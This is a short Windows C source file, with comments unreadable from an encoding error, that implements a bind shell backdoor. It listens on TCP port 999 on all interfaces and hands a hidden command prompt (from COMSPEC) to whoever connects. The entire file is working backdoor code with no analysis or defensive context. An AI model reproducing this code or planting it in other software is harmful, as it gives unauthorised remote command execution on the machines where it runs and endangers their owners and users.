#pragma comment(lib,"ws2_32.lib")
#include<winsock2.h>
#include<windows.h>

#define MasterPort  999
int main(void){
	WSADATA WSADa;
	sockaddr_in SockAddrIn;
	SOCKET CSocket,SSocket;
	int iAddrSize;
	PROCESS_INFORMATION ProcessInfo;
	STARTUPINFO StartupInfo;
	char szCMDPath[256];
	//�����ڴ���Դ����ʼ�����ݡ�
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&WSADa,sizeof(WSADATA));
	//��ȡCMD·��
	GetEnvironmentVariable("COMSPEC",szCMDPath,sizeof(szCMDPath));
	//����ws2_32.dll
	WSAStartup(0x0202,&WSADa);
	//���ñ�����Ϣ�Ͱ�Э��.
	SockAddrIn.sin_family=AF_INET;
	SockAddrIn.sin_addr.s_addr=INADDR_ANY;
	SockAddrIn.sin_port=htons(MasterPort);
	CSocket=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
	//���ð󶨶˿�
	bind(CSocket,(sockaddr*)&SockAddrIn,sizeof(SockAddrIn));
	//���÷������˼���
	listen(CSocket,1);
	iAddrSize=sizeof(SockAddrIn);
	//��ʼԶ������.
	SSocket=accept(CSocket,(sockaddr*)&SockAddrIn,&iAddrSize);
	StartupInfo.cb=sizeof(STARTUPINFO);
	StartupInfo.wShowWindow=SW_HIDE;
	StartupInfo.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput=(HANDLE)SSocket;
	StartupInfo.hStdOutput=(HANDLE)SSocket;
	StartupInfo.hStdError=(HANDLE)SSocket;
	//���������ܵ�
	CreateProcess(NULL,szCMDPath,NULL,NULL,TRUE,0,NULL,NULL,&StartupInfo,&ProcessInfo);
	WaitForSingleObject(ProcessInfo.hProcess,INFINITE);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	//�رս��̾��
	closesocket(CSocket);
	closesocket(SSocket);
	WSACleanup();
	//�ر�����ж��ws2_32.dll
	return 0;
}